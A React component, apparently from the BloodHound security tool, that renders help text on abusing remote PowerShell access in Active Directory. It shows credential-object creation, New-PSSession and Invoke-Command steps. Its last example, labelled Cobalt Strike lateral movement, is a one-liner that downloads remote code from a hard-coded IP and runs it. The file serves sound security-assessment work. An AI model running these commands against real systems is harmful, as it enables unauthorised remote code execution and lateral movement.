// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { EdgeInfoProps } from '../index';
import { Typography } from '@mui/material';

const Abuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName }) => {
    return (
        <>
            <Typography variant='body2'>
                Abuse of this privilege will require you to have interactive access with a system on the network.
            </Typography>
            <Typography variant='body2'>
                A remote session can be opened using the New-PSSession powershell command.
            </Typography>
            <Typography variant='body2'>
                You may need to authenticate to the Domain Controller as{' '}
                {sourceType === 'User'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`}
                . To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes
                from the PowerView help documentation):
            </Typography>
            <Typography component={'pre'}>
                {`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}
            </Typography>
            <Typography variant='body2'>
                Then use the New-PSSession command with the credential we just created:
            </Typography>
            <Typography component={'pre'}>
                {`$session = New-PSSession -ComputerName ${targetName} -Credential $Cred`}
            </Typography>
            <Typography variant='body2'>This will open a powershell session on {targetName}.</Typography>
            <Typography variant='body2'>
                You can then run a command on the system using the Invoke-Command cmdlet and the session you just
                created
            </Typography>
            <Typography component={'pre'}>
                {'Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}'}
            </Typography>
            <Typography variant='body2'>
                Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.
            </Typography>
            <Typography component={'pre'}>
                {`Disconnect-PSSession -Session $session
Remove-PSSession -Session $session`}
            </Typography>
            <Typography variant='body2'>
                An example of running through this cobalt strike for lateral movement is as follows:
            </Typography>
            <Typography component={'pre'}>
                {
                    "powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"
                }
            </Typography>
        </>
    );
};

export default Abuse;
